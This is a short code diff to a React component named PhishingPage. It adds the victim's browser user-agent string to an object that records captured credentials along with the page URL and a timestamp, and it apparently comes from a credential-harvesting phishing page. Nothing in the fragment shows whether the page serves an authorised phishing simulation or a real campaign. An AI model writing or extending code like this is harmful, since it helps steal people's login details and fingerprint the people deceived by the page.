@@ -126,7 +126,8 @@ export default function PhishingPage() {
             const entry = {
               ...credentials,
               source: window.location.href,
-              timestamp: new Date().toISOString()
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
             };
             
             try {
